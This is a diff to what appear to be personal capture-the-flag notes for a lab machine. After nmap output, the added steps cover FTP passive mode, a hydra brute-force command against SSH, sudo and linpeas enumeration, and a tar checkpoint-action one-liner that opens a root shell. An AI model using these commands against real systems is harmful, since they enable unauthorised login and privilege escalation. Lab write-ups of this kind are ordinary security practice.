@@ -11,4 +11,13 @@
 
   Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
   Nmap done: 1 IP address (1 host up) scanned in 18.58 seconds
-2. 
+2. FTP into server then type passive if not it leaves the firewall on the client which prevents the server from responding back
+3. Use locks and task to brute force into ssh
+    hydra -l lin -P users.txt IP ssh
+4. collect the first flag
+5. find out what priveldeges we have by sudo -l or linpeas
+6. use /bin/tar to create a root shell by using
+    tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+7. find root flag
+
+
